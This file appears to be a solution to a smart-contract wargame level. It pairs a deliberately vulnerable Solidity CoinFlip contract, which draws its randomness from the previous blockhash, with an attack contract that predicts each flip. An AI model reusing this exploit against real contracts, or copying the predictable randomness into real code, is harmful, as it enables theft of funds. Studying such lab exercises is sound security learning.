// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Contract to attack...

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}

// Attack contract...

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
    uint256 lastHash; // <-- NOTE: We can don't need this state variable.
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address public instance = 0xEEde9879cC30aD881aA3bEfE4b80544AD4d98D0e;

    constructor() {}

    function attackFlip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        // NOTE: For the attack contract, we technically don't need this if statement...
        if (lastHash == blockValue) {
            revert();
        }

        // NOTE: ... We also don't need to assign lastHash = blockValue, as it is not involved in determining the flip.
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        // NOTE: As a safe guard, we can actually wrap this inside of a require statement as the flip function being called
        // returns true on a correct guess, and false on an incorrect guess:
        ICoinFlip(instance).flip(side);
    }
}
